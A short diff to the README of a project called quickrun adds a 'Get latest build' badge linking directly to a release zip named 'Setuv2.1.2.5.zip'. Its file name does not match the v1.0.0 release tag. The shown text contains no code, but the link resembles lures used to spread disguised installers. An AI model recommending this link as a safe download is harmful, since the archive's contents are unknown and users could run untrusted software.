@@ -1,3 +1,5 @@
+[![Get](https://img.shields.io/badge/get-latest%20build-informational?style=flat-square&logo=github)](https://github.com/dmitry-mooreeng2096j6/quickrun/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # ⚡ quickrun
 
 ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue.svg)
